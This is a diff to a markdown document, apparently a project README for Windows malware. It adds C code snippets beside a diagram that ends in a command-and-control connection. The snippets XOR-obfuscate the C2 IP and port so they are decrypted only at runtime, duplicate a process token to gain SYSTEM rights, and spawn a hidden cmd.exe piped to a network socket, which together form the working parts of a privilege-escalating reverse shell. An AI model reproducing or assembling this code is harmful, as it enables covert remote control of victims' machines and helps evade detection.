@@ -77,6 +77,32 @@ graph TD
     F --> H[Spawn powershell.exe via Pipes]
     H --> I[Establish C2 Connection]
 ```
+### Code Snippet: Dual-Mode Build & Obfuscation
+*Demonstrates how preprocessor directives control the build output and how strings are decrypted only at runtime:*
+
+```c
+#define XOR_KEY 0x42
+
+// 0 = Generator (Output Encrypted Bytes), 1 = Attack (Execute Payload)
+#define BUILD_MODE 1 
+
+// Attack Mode Strings (Pasted from Generator Output)
+char ENCRYPTED_IP[] = "\x73\x72\x6c\x73\x72\x72\x6c\x73\x72\x70\x6c\x75\x77";
+char ENCRYPTED_PORT[] = "\x76\x76\x76\x76";
+
+// Helper function for decryption (Symmetric XOR)
+void xor_crypt_string(char* input, int len, char* output) {
+    for (int i = 0; i < len; i++) {
+        output[i] = input[i] ^ XOR_KEY;
+    }
+    output[len] = '\0';
+}
+
+// ... Inside Payload Logic ...
+// Decrypt strings at runtime
+xor_crypt_string(ENCRYPTED_IP, (int)strlen(ENCRYPTED_IP), decrypted_ip);
+xor_crypt_string(ENCRYPTED_PORT, (int)strlen(ENCRYPTED_PORT), decrypted_port_str);
+```
 
 ### Code Snippet: Token Manipulation Logic
 *A snippet demonstrating the logic used for token duplication (Sanitized for display):*
@@ -96,3 +122,34 @@ if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY
     DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDup);
     // hDup is now a valid SYSTEM token ready for CreateProcessWithTokenW
 }
+```
+
+### Code Snippet: Process Spawning via Pipes
+*Shows how the shell process is spawned with redirected I/O pipes and a hidden window context using the elevated token:*
+
+```c
+HANDLE hStdInRead, hStdInWrite;
+HANDLE hStdOutRead, hStdOutWrite;
+STARTUPINFOA si;
+PROCESS_INFORMATION pi;
+char cmd[] = "cmd.exe /Q";
+
+// Creating pipes for STDIN and STDOUT/STDERR
+CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);
+CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);
+
+memset(&si, 0, sizeof(si));
+si.cb = sizeof(si);
+// Hiding the window and redirecting handles
+si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+si.wShowWindow = SW_HIDE;
+si.hStdInput = hStdInRead;
+si.hStdOutput = hStdOutWrite;
+si.hStdError = hStdOutWrite;
+
+// Spawning the initial shell process with redirected I/O
+if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+    closesocket(sock);
+    return;
+}
+```
